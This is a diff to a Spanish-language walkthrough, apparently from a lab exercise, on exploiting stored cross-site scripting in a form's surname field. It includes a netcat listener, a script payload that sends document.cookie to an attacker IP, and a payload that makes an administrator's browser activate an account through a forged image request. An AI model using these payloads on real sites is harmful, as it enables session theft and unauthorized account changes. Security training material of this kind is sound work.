@@ -37,6 +37,7 @@ nc -lvp 80
 
 Introducimos el siguiente codigo en el formulario, por ejemplo en el campo de apellido:  
 ```
+#XSS Payload
 <script>img = new Image(); img.src = "http://192.168.43.57/a.php?"+document.cookie;</script>
 ```
 Hemos recibido la cookie!
@@ -47,6 +48,12 @@ Si nos fijamos al clicar el boton, es simplemente una acción que lleva a una UR
 Para ello volvemos a crear otro usuario y en el apellido, por ejemplo. Metemos el siguiente código:  
 
 ```
-<script>img = new Image(); img.src = "http://192.168.43.58/admin/admin.php?id=11&status=active";</script>
+# XSS Payload
+<script>document.write('<img src="http://192.168.56.104/admin/admin.php?id=11&status=active"/>');</script>
+
 ```
+FOTO 9
+esperamos un poco y voilá! se activó!
+FOTO 10
+
 
